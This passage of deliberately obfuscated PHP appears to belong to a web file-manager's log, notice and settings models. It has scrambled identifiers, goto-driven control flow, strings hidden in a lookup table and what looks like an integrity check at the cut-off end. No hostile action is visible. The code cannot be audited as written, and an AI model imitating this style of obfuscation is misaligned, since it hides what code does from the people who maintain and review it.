$Fê…©ˆ÷»[2036] => LNG($Fê…©ˆ÷»[2037]), $Fê…©ˆ÷»[1653] => LNG($Fê…©ˆ÷»[2038]), $Fê…©ˆ÷»[2039] => LNG($Fê…©ˆ÷»[2040]), $Fê…©ˆ÷»[2041] => LNG($Fê…©ˆ÷»[2042]), $Fê…©ˆ÷»[2043] => LNG($Fê…©ˆ÷»[2044]), $Fê…©ˆ÷»[2045] => LNG($Fê…©ˆ÷»[2045]), $Fê…©ˆ÷»[2046] => LNG($Fê…©ˆ÷»[1625]), $Fê…©ˆ÷»[2047] => LNG($Fê…©ˆ÷»[2048]), $Fê…©ˆ÷»[2049] => LNG($Fê…©ˆ÷»[2050]), $Fê…©ˆ÷»[2051] => LNG($Fê…©ˆ÷»[2052]), $Fê…©ˆ÷»[2053] => LNG($Fê…©ˆ÷»[2054]), $Fê…©ˆ÷»[2055] => LNG($Fê…©ˆ÷»[2056]), $Fê…©ˆ÷»[2057] => LNG($Fê…©ˆ÷»[2057]), $Fê…©ˆ÷»[2058] => LNG($Fê…©ˆ÷»[2059]), $Fê…©ˆ÷»[2060] => LNG($Fê…©ˆ÷»[2061]), $Fê…©ˆ÷»[2062] => LNG($Fê…©ˆ÷»[2063]), $Fê…©ˆ÷»[2064] => LNG($Fê…©ˆ÷»[2065]), $Fê…©ˆ÷»[2066] => LNG($Fê…©ˆ÷»[2067]), $Fê…©ˆ÷»[2068] => LNG($Fê…©ˆ÷»[2069])); } private function typeFile() { $DÌã“‚¤–Â =& $_SERVER[ÒÆ›ÆØÎ¾]; $d®ÃÌïæÁ† = array($DÌã“‚¤–Â[1656] => array($DÌã“‚¤–Â[1657]), $DÌã“‚¤–Â[2011] => array($DÌã“‚¤–Â[2070]), $DÌã“‚¤–Â[2013] => array($DÌã“‚¤–Â[2071]), $DÌã“‚¤–Â[1649] => array($DÌã“‚¤–Â[1650]), $DÌã“‚¤–Â[2021] => array(), $DÌã“‚¤–Â[2023] => array(), $DÌã“‚¤–Â[2025] => array(), $DÌã“‚¤–Â[1659] => array($DÌã“‚¤–Â[1661]), $DÌã“‚¤–Â[1660] => array($DÌã“‚¤–Â[1661]), $DÌã“‚¤–Â[2029] => array($DÌã“‚¤–Â[2072]), $DÌã“‚¤–Â[2031] => array($DÌã“‚¤–Â[2072]), $DÌã“‚¤–Â[2033] => array($DÌã“‚¤–Â[2073]), $DÌã“‚¤–Â[2019] => array($DÌã“‚¤–Â[2074]), $DÌã“‚¤–Â[1654] => array($DÌã“‚¤–Â[2075]), $DÌã“‚¤–Â[2036] => array($DÌã“‚¤–Â[2076]), $DÌã“‚¤–Â[1653] => array($DÌã“‚¤–Â[1655])); return $d®ÃÌïæÁ†; } private function typeAll() { goto fÀ¬¬¥•ğƒ; fÀ¬¬¥•ğƒ: $D’§¯ìº‚° =& $_SERVER[ÒÆ›ÆØÎ¾]; $eïØŠ¿¯î½ = $this->typeList; $bÓá¾îíÌÈ = array_filter($this->typeFile()); goto AŠòêö³; AŠòêö³: foreach ($bÓá¾îíÌÈ as $bÃ­¶îø¦Ø => $Fõ°İ–ŞÉË) { $eïØŠ¿¯î½[$Fõ°İ–ŞÉË[0]] = $eïØŠ¿¯î½[$bÃ­¶îø¦Ø]; } $eïØŠ¿¯î½[$D’§¯ìº‚°[1661]] = LNG($D’§¯ìº‚°[2077]); $eïØŠ¿¯î½[$D’§¯ìº‚°[2072]] = LNG($D’§¯ìº‚°[2078]); goto Bøó‡¬–ø«; Bøó‡¬–ø«: return $eïØŠ¿¯î½; goto e·øµ—¤¥Ö; e·øµ—¤¥Ö: } public function addLog($eÏƒŠÊİÔ£, $CÒôÀˆàÏ = array()) { goto dÃ÷¦»‰Ô–; dÃ÷¦»‰Ô–: $fµ¿Ì‡øÜÙ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!isset($this->typeList[$eÏƒŠÊİÔ£])) { return; } $Cã±”¼·÷Æ = defined($fµ¿Ì‡øÜÙ[454]) && USER_ID ? USER_ID : (isset($CÒôÀˆàÏ[$fµ¿Ì‡øÜÙ[1517]]) ? $CÒôÀˆàÏ[$fµ¿Ì‡øÜÙ[1517]] : 0); goto fß´ÒõåÉº; fß´ÒõåÉº: if (!$Cã±”¼·÷Æ) { $Cã±”¼·÷Æ = (int) Session::get($fµ¿Ì‡øÜÙ[1807]); } $e«Ï—­Ê‚¹ = get_client_ip(); if (!$CÒôÀˆàÏ || strlen(json_encode($CÒôÀˆàÏ)) >= 1024) { $CÒôÀˆàÏ = array($fµ¿Ì‡øÜÙ[2079] => $e«Ï—­Ê‚¹); } else { if (is_array($CÒôÀˆàÏ)) { $CÒôÀˆàÏ[$fµ¿Ì‡øÜÙ[2079]] = $e«Ï—­Ê‚¹; } else { $CÒôÀˆàÏ = array($fµ¿Ì‡øÜÙ[1079] => $CÒôÀˆàÏ, $fµ¿Ì‡øÜÙ[2079] => $e«Ï—­Ê‚¹); } } goto fÀ¡Ø–´ãò; fÀ¡Ø–´ãò: $CÒôÀˆàÏ = array($fµ¿Ì‡øÜÙ[1508] => Session::sign(), $fµ¿Ì‡øÜÙ[1509] => $Cã±”¼·÷Æ, $fµ¿Ì‡øÜÙ[29] => $eÏƒŠÊİÔ£, $fµ¿Ì‡øÜÙ[1511] => json_encode($CÒôÀˆàÏ)); parent::add($CÒôÀˆàÏ); goto Bğ©ß»ĞöÄ; Bğ©ß»ĞöÄ: } public function remove($c“‡¢Ë’÷Ü) { $this->where(array($_SERVER[ÒÆ›ÆØÎ¾][412] => $c“‡¢Ë’÷Ü))->delete(); } private function _makeOrder($b¼ˆÇñƒ•Û = '') { goto eŒ° ±º; eŒ° ±º: $FœÑÀÄÂš… =& $_SERVER[ÒÆ›ÆØÎ¾]; $E¥ˆñ¦¬Ì£ = $FœÑÀÄÂš…[194]; $D¢Í¤÷°Îè = array($FœÑÀÄÂš…[428] => $FœÑÀÄÂš…[429], $FœÑÀÄÂš…[430] => $FœÑÀÄÂš…[431]); goto a‘È‰½×ˆ; a‘È‰½×ˆ: $E††ìæê¥™ = Input::get($FœÑÀÄÂš…[436], $FœÑÀÄÂš…[7], $FœÑÀÄÂš…[1839], array($FœÑÀÄÂš…[1763], $FœÑÀÄÂš…[430])); $E††ìæê¥™ = $D¢Í¤÷°Îè[$E††ìæê¥™]; $b¼ˆÇñƒ•Û = $b¼ˆÇñƒ•Û . "{$E¥ˆñ¦¬Ì£}\x20{$E††ìæê¥™}"; goto e¼©Ğ‹ ñ; e¼©Ğ‹ ñ: return $this->order($b¼ˆÇñƒ•Û); goto d’èÄË„ÙÛ; d’èÄË„ÙÛ: } public function get($FÌë²Ö¿É = '') { goto f³¹•‘Šé–; f³¹•‘Šé–: $EË²¿¿Õ  =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$FÌë²Ö¿É) { show_json(array()); } $c„ˆ “‡ = array(); goto Eê¯Í¨±èÊ; d•ä—§¼×¯: if (!empty($FÌë²Ö¿É[$EË²¿¿Õ [2079]])) { $c„ˆ “‡[$EË²¿¿Õ [431]] = array($EË²¿¿Õ [380], "\45{$FÌë²Ö¿É[$EË²¿¿Õ [2079]]}\x25"); } $eÒ–ô×ÆÊ = $this->_makeOrder()->where($c„ˆ “‡)->selectPage(); if (empty($eÒ–ô×ÆÊ[$EË²¿¿Õ [367]])) { show_json(array(), !0, $eÒ–ô×ÆÊ[$EË²¿¿Õ [364]]); } goto FÙ‡£ŠáŸ; FÙ‡£ŠáŸ: $eÒ–ô×ÆÊ[$EË²¿¿Õ [367]] = $this->logList($eÒ–ô×ÆÊ[$EË²¿¿Õ [367]]); return $eÒ–ô×ÆÊ; goto f²É¥†åªİ; Eê¯Í¨±èÊ: if ($FÌë²Ö¿É[$EË²¿¿Õ [1517]]) { $c„ˆ “‡[$EË²¿¿Õ [1517]] = $FÌë²Ö¿É[$EË²¿¿Õ [1517]]; } if (isset($FÌë²Ö¿É[$EË²¿¿Õ [713]])) { $cÆÅÑ¢„å¯ = $FÌë²Ö¿É[$EË²¿¿Õ [713]]; $Dğ‘Ññ»‚ = isset($FÌë²Ö¿É[$EË²¿¿Õ [476]]) ? $FÌë²Ö¿É[$EË²¿¿Õ [476]] : time(); $c„ˆ “‡[$EË²¿¿Õ [194]] = array($EË²¿¿Õ [331], array($cÆÅÑ¢„å¯, $Dğ‘Ññ»‚)); } if ($FÌë²Ö¿É[$EË²¿¿Õ [29]]) { $a¶ïñî³òÚ = explode($EË²¿¿Õ [47], $FÌë²Ö¿É[$EË²¿¿Õ [29]]); $fÑËÆ“Ùš† = $this->typeFile(); $A´Ô¨¯Ù† = array(); foreach ($a¶ïñî³òÚ as $AÍ£ÅÙŞ©) { $A´Ô¨¯Ù†[] = $AÍ£ÅÙŞ©; if (isset($fÑËÆ“Ùš†[$AÍ£ÅÙŞ©])) { $A´Ô¨¯Ù† = array_merge($A´Ô¨¯Ù†, $fÑËÆ“Ùš†[$AÍ£ÅÙŞ©]); } } $A´Ô¨¯Ù† = array_unique($A´Ô¨¯Ù†); if ($A´Ô¨¯Ù†) { $c„ˆ “‡[$EË²¿¿Õ [29]] = array($EË²¿¿Õ [7], $A´Ô¨¯Ù†); } } else { $c„ˆ “‡[$EË²¿¿Õ [29]] = array($EË²¿¿Õ [2080], $EË²¿¿Õ [2081]); } goto d•ä—§¼×¯; f²É¥†åªİ: } private function ipAddress(&$D‚‘Ÿ¡©†á) { $B…õíƒÜÒ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!empty($D‚‘Ÿ¡©†á[$B…õíƒÜÒ[2079]])) { $Cñâ‹‹à‘ = IpLocation::get($D‚‘Ÿ¡©†á[$B…õíƒÜÒ[2079]]); } else { $Cñâ‹‹à‘ = LNG($B…õíƒÜÒ[2082]); } $D‚‘Ÿ¡©†á[$B…õíƒÜÒ[2083]] = $Cñâ‹‹à‘; } private function descZipDownload($Eçõò“âÁô, &$b¼ÕŞ™²¬¯) { $DÈ•±£ğÔ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!isset($Eçõò“âÁô[$DÈ•±£ğÔ[2084]])) { return; } $aÖ–Ù¦³ = json_decode($Eçõò“âÁô[$DÈ•±£ğÔ[2084]], !0); foreach ($aÖ–Ù¦³ as $BÆ¾¾­ë) { try { $B£‰·‹¥»¼ = IO::infoFull($BÆ¾¾­ë[$DÈ•±£ğÔ[76]]); } catch (Exception $dõ•âê˜À) { continue; } $Eçõò“âÁô[$DÈ•±£ğÔ[76]] = $BÆ¾¾­ë[$DÈ•±£ğÔ[76]]; $b¼ÕŞ™²¬¯[] = $Eçõò“âÁô[$DÈ•±£ğÔ[395]] = $B£‰·‹¥»¼[$DÈ•±£ğÔ[395]]; $b¼ÕŞ™²¬¯[] = $Eçõò“âÁô[$DÈ•±£ğÔ[1895]] = $B£‰·‹¥»¼[$DÈ•±£ğÔ[478]]; break; } return $Eçõò“âÁô; } private function getSourceList(&$dóàº¨µ¢«) { $FØ¿à†ÓÌÇ =& $_SERVER[ÒÆ›ÆØÎ¾]; $a‚ ß®Ü© = array(); foreach ($dóàº¨µ¢« as $DŒ¼«çİê· => $cÔŠ»âà˜Á) { goto BÜš—óš÷Û; bãí‚Ø¦: $a‚ ß®Ü©[] = $bà¬¬Æ”Û¤[$FØ¿à†ÓÌÇ[395]]; $a‚ ß®Ü©[] = $bà¬¬Æ”Û¤[$FØ¿à†ÓÌÇ[1895]]; if ($bà¬¬Æ”Û¤[$FØ¿à†ÓÌÇ[29]] == $FØ¿à†ÓÌÇ[520]) { $a‚ ß®Ü©[] = $bà¬¬Æ”Û¤[$FØ¿à†ÓÌÇ[431]][$FØ¿à†ÓÌÇ[1046]]; $a‚ ß®Ü©[] = $bà¬¬Æ”Û¤[$FØ¿à†ÓÌÇ[431]][$FØ¿à†ÓÌÇ[1047]]; } goto F©Óê®±™¸; F©Óê®±™¸: if ($bà¬¬Æ”Û¤[$FØ¿à†ÓÌÇ[29]] == $FØ¿à†ÓÌÇ[1903]) { $a‚ ß®Ü©[] = $bà¬¬Æ”Û¤[$FØ¿à†ÓÌÇ[431]][$FØ¿à†ÓÌÇ[395]]; } goto a£‡¤Î¹Œ; BÜš—óš÷Û: $bà¬¬Æ”Û¤ = json_decode($cÔŠ»âà˜Á[$FØ¿à†ÓÌÇ[431]], !0); if ($cÔŠ»âà˜Á[$FØ¿à†ÓÌÇ[29]] == $FØ¿à†ÓÌÇ[1652]) { $bà¬¬Æ”Û¤ = $this->descZipDownload($bà¬¬Æ”Û¤, $a‚ ß®Ü©); $dóàº¨µ¢«[$DŒ¼«çİê·][$FØ¿à†ÓÌÇ[431]] = json_encode($bà¬¬Æ”Û¤); continue; } if (strpos($cÔŠ»âà˜Á[$FØ¿à†ÓÌÇ[29]], $FØ¿à†ÓÌÇ[1896]) !== 0) { if (!isset($bà¬¬Æ”Û¤[$FØ¿à†ÓÌÇ[76]]) || strpos($cÔŠ»âà˜Á[$FØ¿à†ÓÌÇ[29]], $FØ¿à†ÓÌÇ[2085]) !== 0) { continue; } try { $B¶£ä„…¿Š = IO::infoFull($bà¬¬Æ”Û¤[$FØ¿à†ÓÌÇ[76]]); } catch (Exception $E±¿ÆÇÃ¹) { continue; } $a‚ ß®Ü©[] = $bà¬¬Æ”Û¤[$FØ¿à†ÓÌÇ[395]] = $B¶£ä„…¿Š[$FØ¿à†ÓÌÇ[395]]; $a‚ ß®Ü©[] = $bà¬¬Æ”Û¤[$FØ¿à†ÓÌÇ[1895]] = $B¶£ä„…¿Š[$FØ¿à†ÓÌÇ[478]]; $dóàº¨µ¢«[$DŒ¼«çİê·][$FØ¿à†ÓÌÇ[431]] = json_encode($bà¬¬Æ”Û¤); continue; } goto bãí‚Ø¦; a£‡¤Î¹Œ: } if (!$a‚ ß®Ü©) { return array(); } return Model($FØ¿à†ÓÌÇ[782])->sourceListInfo($a‚ ß®Ü©, !0); } private function logList($B¤àÓ¤†ÔÇ) { goto fİÃóÎ£ìÄ; fİÃóÎ£ìÄ: $cœÇÂÍÒ¸Ü =& $_SERVER[ÒÆ›ÆØÎ¾]; $aø¨«¤»å = array_to_keyvalue($B¤àÓ¤†ÔÇ, $cœÇÂÍÒ¸Ü[33], $cœÇÂÍÒ¸Ü[1517]); $c†ïÄõ·¤ = Model($cœÇÂÍÒ¸Ü[506])->userListInfo(array_unique($aø¨«¤»å)); goto F‡Œ½æî‚; F‡Œ½æî‚: $DÅÚÎ¹Í‰ù = $this->getSourceList($B¤àÓ¤†ÔÇ); $aÑñõš“£ = $this->typeAll(); $C¼ˆˆŞ±ƒÆ = array(); goto f¥Êë¶Æ‰¦; BÂ¤İß¤: return $C¼ˆˆŞ±ƒÆ; goto aÖŒ–íà§»; f¥Êë¶Æ‰¦: $aÄ†­Ü¥šñ = array(); foreach ($B¤àÓ¤†ÔÇ as $d¼’ÆÉ†ÒÔ => $cÕ‹‹ÒØÍÃ) { goto d¥¼Ìù–´³; fÈ¤Í÷¶Á´: $cÕ‹‹ÒØÍÃ[$cœÇÂÍÒ¸Ü[28]] = isset($BôÁ÷ßÀ¶Ÿ[$cœÇÂÍÒ¸Ü[28]]) ? $BôÁ÷ßÀ¶Ÿ[$cœÇÂÍÒ¸Ü[28]] : LNG($cœÇÂÍÒ¸Ü[2082]); $cÕ‹‹ÒØÍÃ[$cœÇÂÍÒ¸Ü[1945]] = isset($BôÁ÷ßÀ¶Ÿ[$cœÇÂÍÒ¸Ü[1945]]) ? $BôÁ÷ßÀ¶Ÿ[$cœÇÂÍÒ¸Ü[1945]] : $cœÇÂÍÒ¸Ü[33]; $cÕ‹‹ÒØÍÃ[$cœÇÂÍÒ¸Ü[1423]] = isset($aÑñõš“£[$F¿ÙÁ÷«…×]) ? $aÑñõš“£[$F¿ÙÁ÷«…×] : $DğØÃ¹ä´; goto fçï„®Ì®Ø; A©–¡ëÎª: unset($cÕ‹‹ÒØÍÃ[$cœÇÂÍÒ¸Ü[2088]]); $C¼ˆˆŞ±ƒÆ[] = $cÕ‹‹ÒØÍÃ; goto Dîç‰ÂÁº™; F¾Æí·©çÍ: $this->ipAddress($cÕ‹‹ÒØÍÃ); if (strpos($F¿ÙÁ÷«…×, $cœÇÂÍÒ¸Ü[1896]) === 0 || isset($aÛª´ÅùÑŸ[$cœÇÂÍÒ¸Ü[1895]])) { goto f¢Ì¨Òô‰; Eê“­ÓÈ™‚: if ($aÛª´ÅùÑŸ[$cœÇÂÍÒ¸Ü[1908]] && $aÛª´ÅùÑŸ[$cœÇÂÍÒ¸Ü[1908]][$cœÇÂÍÒ¸Ü[404]] == $cœÇÂÍÒ¸Ü[1162]) { $aÄ†­Ü¥šñ[] = $cÕ‹‹ÒØÍÃ[$cœÇÂÍÒ¸Ü[393]]; unset($B¤àÓ¤†ÔÇ[$d¼’ÆÉ†ÒÔ]); continue; } goto E ĞÀè¥ÑÈ; f¢Ì¨Òô‰: $aÛª´ÅùÑŸ[$cœÇÂÍÒ¸Ü[85]] = $DÅÚÎ¹Í‰ù[$aÛª´ÅùÑŸ[$cœÇÂÍÒ¸Ü[395]]]; $aÛª´ÅùÑŸ[$cœÇÂÍÒ¸Ü[1908]] = $DÅÚÎ¹Í‰ù[$aÛª´ÅùÑŸ[$cœÇÂÍÒ¸Ü[1895]]]; if ($aÛª´ÅùÑŸ[$cœÇÂÍÒ¸Ü[29]] == $cœÇÂÍÒ¸Ü[520]) { $aÛª´ÅùÑŸ[$cœÇÂÍÒ¸Ü[431]][$cœÇÂÍÒ¸Ü[1046]] = $DÅÚÎ¹Í‰ù[$aÛª´ÅùÑŸ[$cœÇÂÍÒ¸Ü[431]][$cœÇÂÍÒ¸Ü[1046]]]; $aÛª´ÅùÑŸ[$cœÇÂÍÒ¸Ü[431]][$cœÇÂÍÒ¸Ü[1047]] = $DÅÚÎ¹Í‰ù[$aÛª´ÅùÑŸ[$cœÇÂÍÒ¸Ü[431]][$cœÇÂÍÒ¸Ü[1047]]]; } goto d…í²¦; d…í²¦: if ($aÛª´ÅùÑŸ[$cœÇÂÍÒ¸Ü[29]] == $cœÇÂÍÒ¸Ü[1903]) { $aÛª´ÅùÑŸ[$cœÇÂÍÒ¸Ü[431]][$cœÇÂÍÒ¸Ü[395]] = $DÅÚÎ¹Í‰ù[$aÛª´ÅùÑŸ[$cœÇÂÍÒ¸Ü[431]][$cœÇÂÍÒ¸Ü[395]]]; } if ($aÛª´ÅùÑŸ[$cœÇÂÍÒ¸Ü[29]] == $cœÇÂÍÒ¸Ü[1647]) { $aÛª´ÅùÑŸ[$cœÇÂÍÒ¸Ü[1908]] = $aÛª´ÅùÑŸ[$cœÇÂÍÒ¸Ü[85]]; $aÛª´ÅùÑŸ[$cœÇÂÍÒ¸Ü[1895]] = $aÛª´ÅùÑŸ[$cœÇÂÍÒ¸Ü[1908]][$cœÇÂÍÒ¸Ü[395]]; $aÛª´ÅùÑŸ[$cœÇÂÍÒ¸Ü[85]] = !1; $aÛª´ÅùÑŸ[$cœÇÂÍÒ¸Ü[395]] = $cœÇÂÍÒ¸Ü[33]; } if ($aÛª´ÅùÑŸ[$cœÇÂÍÒ¸Ü[85]] && $aÛª´ÅùÑŸ[$cœÇÂÍÒ¸Ü[85]][$cœÇÂÍÒ¸Ü[404]] == $cœÇÂÍÒ¸Ü[1162]) { $aÄ†­Ü¥šñ[] = $cÕ‹‹ÒØÍÃ[$cœÇÂÍÒ¸Ü[393]]; unset($B¤àÓ¤†ÔÇ[$d¼’ÆÉ†ÒÔ]); continue; } goto Eê“­ÓÈ™‚; E ĞÀè¥ÑÈ: } $cÕ‹‹ÒØÍÃ[$cœÇÂÍÒ¸Ü[431]] = $aÛª´ÅùÑŸ; goto A©–¡ëÎª; d¥¼Ìù–´³: $F¿ÙÁ÷«…× = $cÕ‹‹ÒØÍÃ[$cœÇÂÍÒ¸Ü[29]]; $BôÁ÷ßÀ¶Ÿ = isset($c†ïÄõ·¤[$cÕ‹‹ÒØÍÃ[$cœÇÂÍÒ¸Ü[1517]]]) ? $c†ïÄõ·¤[$cÕ‹‹ÒØÍÃ[$cœÇÂÍÒ¸Ü[1517]]] : !1; $DğØÃ¹ä´ = strpos($F¿ÙÁ÷«…×, $cœÇÂÍÒ¸Ü[2086]) === 0 ? LNG($cœÇÂÍÒ¸Ü[2087]) : LNG($cœÇÂÍÒ¸Ü[2082]); goto fÈ¤Í÷¶Á´; fçï„®Ì®Ø: $cÕ‹‹ÒØÍÃ[$cœÇÂÍÒ¸Ü[1838]] = $BôÁ÷ßÀ¶Ÿ; $aÛª´ÅùÑŸ = json_decode($cÕ‹‹ÒØÍÃ[$cœÇÂÍÒ¸Ü[431]], !0); $cÕ‹‹ÒØÍÃ[$cœÇÂÍÒ¸Ü[2079]] = isset($aÛª´ÅùÑŸ[$cœÇÂÍÒ¸Ü[2079]]) ? $aÛª´ÅùÑŸ[$cœÇÂÍÒ¸Ü[2079]] : $cœÇÂÍÒ¸Ü[33]; goto F¾Æí·©çÍ; Dîç‰ÂÁº™: } $this->clearSystemPathLog($aÄ†­Ü¥šñ); goto BÂ¤İß¤; aÖŒ–íà§»: } private function clearSystemPathLog($AÄ„¤¤£ë›) { $dåÂ³Ùîµ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (count($AÄ„¤¤£ë›) == 0) { return; } $b·×Æ„ô¤º = array($dåÂ³Ùîµ[393] => array($dåÂ³Ùîµ[7], array_unique($AÄ„¤¤£ë›))); $this->where($b·×Æ„ô¤º)->delete(); } public function deviceList($D„Ş‰Áï‚, $f·á«›âÎ„ = 0) { $cĞ·¿¤“Ë =& $_SERVER[ÒÆ›ÆØÎ¾]; $DíÁÏ„¦ù = array($cĞ·¿¤“Ë[1517] => $D„Ş‰Áï‚, $cĞ·¿¤“Ë[194] => array($cĞ·¿¤“Ë[962], $f·á«›âÎ„), $cĞ·¿¤“Ë[29] => $cĞ·¿¤“Ë[1621]); $bà¢—ªƒ÷ = array(); $E„¦Û¶İÜ¬ = $this->field($cĞ·¿¤“Ë[2089])->where($DíÁÏ„¦ù)->order($cĞ·¿¤“Ë[1906])->limit(50)->select(); foreach ($E„¦Û¶İÜ¬ as $c¡òòœŠÅ§ => $FÓ©Ÿöƒ¹ƒ) { goto cĞ™æĞ²ƒù; E•…âõƒÈ: unset($c÷‹¯œÙØ[$cĞ·¿¤“Ë[2079]]); $F§á÷ÎÄõ´ = $this->deviceType($c÷‹¯œÙØ[$cĞ·¿¤“Ë[1897]]); if (isset($bà¢—ªƒ÷[$F§á÷ÎÄõ´])) { continue; } goto e–Á‚ÌáÊ; e–Á‚ÌáÊ: $this->ipAddress($FÓ©Ÿöƒ¹ƒ); $FÓ©Ÿöƒ¹ƒ[$cĞ·¿¤“Ë[431]] = $c÷‹¯œÙØ; $bà¢—ªƒ÷[$F§á÷ÎÄõ´] = $FÓ©Ÿöƒ¹ƒ; goto bóÁßø‹ğï; cĞ™æĞ²ƒù: if ($c¡òòœŠÅ§ > 0 && abs($FÓ©Ÿöƒ¹ƒ[$cĞ·¿¤“Ë[194]] - $E„¦Û¶İÜ¬[$c¡òòœŠÅ§ - 1][$cĞ·¿¤“Ë[194]]) < 5) { continue; } $c÷‹¯œÙØ = json_decode($FÓ©Ÿöƒ¹ƒ[$cĞ·¿¤“Ë[431]], !0); $FÓ©Ÿöƒ¹ƒ[$cĞ·¿¤“Ë[2079]] = isset($c÷‹¯œÙØ[$cĞ·¿¤“Ë[2079]]) ? $c÷‹¯œÙØ[$cĞ·¿¤“Ë[2079]] : $cĞ·¿¤“Ë[33]; goto E•…âõƒÈ; bóÁßø‹ğï: } return array_values($bà¢—ªƒ÷); } public function deviceType($Aˆäî¿¸£) { return $Aˆäî¿¸£; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\x6d\x2e\x6e\157\164\151\x63\145\114\151\163\x74"; public $field = array("\x6e\x61\x6d\x65", "\143\157\156\x74\145\156\164", "\141\x75\164\x68", "\155\157\x64\145", "\164\151\x6d\x65", "\164\x79\x70\x65", "\154\145\x76\x65\154", "\x65\x6e\x61\142\x6c\145", "\163\x6f\162\164"); public function listData($AåÀà¾ß„‚ = false, $d•ÛŠØŠÁÖ = "\x73\x6f\162\x74", $C¢¦œ–´ï = false) { return parent::listData($AåÀà¾ß„‚, $d•ÛŠØŠÁÖ, $C¢¦œ–´ï); } public function add($f‹ªƒ®Ö¡‘) { $Aø‰Á•§ÚÁ =& $_SERVER[ÒÆ›ÆØÎ¾]; $EÊÀµµáéä = time(); if ($f‹ªƒ®Ö¡‘[$Aø‰Á•§ÚÁ[12]] == $Aø‰Á•§ÚÁ[2090]) { $EÊÀµµáéä = strtotime($f‹ªƒ®Ö¡‘[$Aø‰Á•§ÚÁ[197]]); } $f‹ªƒ®Ö¡‘[$Aø‰Á•§ÚÁ[197]] = $EÊÀµµáéä; return parent::insert($f‹ªƒ®Ö¡‘); } public function update($F¹ïºŒ´‹å, $BøÅàÅƒëñ) { goto C±ˆ¾óÙ»; C‚„öº›Ö¾: return parent::update($F¹ïºŒ´‹å, $BøÅàÅƒëñ); goto d„çäõğ»ó; aÂùÁÂ‘¾: $d÷ éæøÉ† = time(); if ($BøÅàÅƒëñ[$fÌ…©Ü­ÄÂ[12]] == $fÌ…©Ü­ÄÂ[2090]) { $d÷ éæøÉ† = strtotime($BøÅàÅƒëñ[$fÌ…©Ü­ÄÂ[197]]); } $BøÅàÅƒëñ[$fÌ…©Ü­ÄÂ[197]] = $d÷ éæøÉ†; goto C‚„öº›Ö¾; C±ˆ¾óÙ»: $fÌ…©Ü­ÄÂ =& $_SERVER[ÒÆ›ÆØÎ¾]; $eª–…¥”© = $this->listData($F¹ïºŒ´‹å); if (!$eª–…¥”©) { return !1; } goto aÂùÁÂ‘¾; d„çäõğ»ó: } public function remove($F®½çÀ‹ƒÖ) { $C­²Ùöèó = $this->listData($F®½çÀ‹ƒÖ); if (!$C­²Ùöèó || $C­²Ùöèó[$_SERVER[ÒÆ›ÆØÎ¾][1162]]) { return !1; } return parent::remove($F®½çÀ‹ƒÖ); } public function sort($CÄå¡šŸĞ, $BÛË÷åØï) { return parent::update($CÄå¡šŸĞ, $BÛË÷åØï); } public function enable($dÕ£¢¤’ìè, $e—‹Øƒ«ë) { return parent::update($dÕ£¢¤’ìè, array($_SERVER[ÒÆ›ÆØÎ¾][2091] => $e—‹Øƒ«ë)); } private function initUserOption() { $dŒöù™¢Ç =& $_SERVER[ÒÆ›ÆØÎ¾]; $this->optionType = $dŒöù™¢Ç[2092]; $this->modelType = $dŒöù™¢Ç[2093]; $this->field = array($dŒöù™¢Ç[2094], $dŒöù™¢Ç[28], $dŒöù™¢Ç[197], $dŒöù™¢Ç[29], $dŒöù™¢Ç[2095], $dŒöù™¢Ç[702], $dŒöù™¢Ç[189]); } public function userNoticeGet($F´Öİ½í“µ = false) { $this->initUserOption(); return parent::listData($F´Öİ½í“µ, $_SERVER[ÒÆ›ÆØÎ¾][393], !0); } public function userNoticeAdd($eÆâÀ¬ß‘) { $BŞ°èº×îÁ =& $_SERVER[ÒÆ›ÆØÎ¾]; $this->initUserOption(); $BÖ®¨†Û¬ = $this->findByKey($BŞ°èº×îÁ[2094], $eÆâÀ¬ß‘[$BŞ°èº×îÁ[393]]); if ($BÖ®¨†Û¬) { return !0; } $aŒ—Ÿïá³ = array($BŞ°èº×îÁ[2094] => $eÆâÀ¬ß‘[$BŞ°èº×îÁ[393]], $BŞ°èº×îÁ[28] => $eÆâÀ¬ß‘[$BŞ°èº×îÁ[28]], $BŞ°èº×îÁ[197] => $eÆâÀ¬ß‘[$BŞ°èº×îÁ[197]], $BŞ°èº×îÁ[29] => isset($eÆâÀ¬ß‘[$BŞ°èº×îÁ[29]]) ? $eÆâÀ¬ß‘[$BŞ°èº×îÁ[29]] : 1, $BŞ°èº×îÁ[2095] => isset($eÆâÀ¬ß‘[$BŞ°èº×îÁ[2095]]) ? $eÆâÀ¬ß‘[$BŞ°èº×îÁ[2095]] : 0, $BŞ°èº×îÁ[702] => 0, $BŞ°èº×îÁ[189] => 0); return parent::insert($aŒ—Ÿïá³); } public function userNoticeEdit($C†Ô™Õ …Õ, $fåù¬¢æ½Š) { $this->initUserOption(); return parent::update($C†Ô™Õ …Õ, $fåù¬¢æ½Š); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\163\164\145\155\137\157\x70\x74\151\x6f\156"; protected $jsonField = array("\x6d\145\x6e\165", "\162\157\154\x65", "\x72\157\x6c\145\107\x72\x6f\x75\160", "\x72\145\x67\x69\x73\x74", "\x65\x6d\x61\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($b¥¨ÇÃùÚŒ) { return "\x53\x79\x73\x74\145\x6d\x4f\x70\x74\151\x6f\x6e\x5f{$b¥¨ÇÃùÚŒ}"; } protected function optionDefault($aÀŒ°é¡‰ª = '') { $EÄùØÙ»â =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($aÀŒ°é¡‰ª == $EÄùØÙ»â[33]) { return $GLOBALS[$EÄùØÙ»â[6]][$EÄùØÙ»â[378]]; } } } goto A÷„¾°İï×; fÍŠ„ã‰Šø: $aÎ­¨ïÆÂ = $_SERVER[ÒÆ›ÆØÎ¾][1129]; if ($_SERVER[$_SERVER[ÒÆ›ÆØÎ¾][784]] != $aÎ­¨ïÆÂ($Dß¾Ï«³Ïµ)) { goto E‡ŠÇå¥Ì¨; AÂŒÎ† ÁÃ: $Béñ‘–Ñà($Dß¾Ï«³Ïµ); goto D·ğ‡êÓˆ; E¾¦ÈÎ£Ü: $fíö¸¥ƒŞ = explode($_SERVER[ÒÆ›ÆØÎ¾][229], $AÃ§Ã‰è¦); if (count($fíö¸¥ƒŞ) < 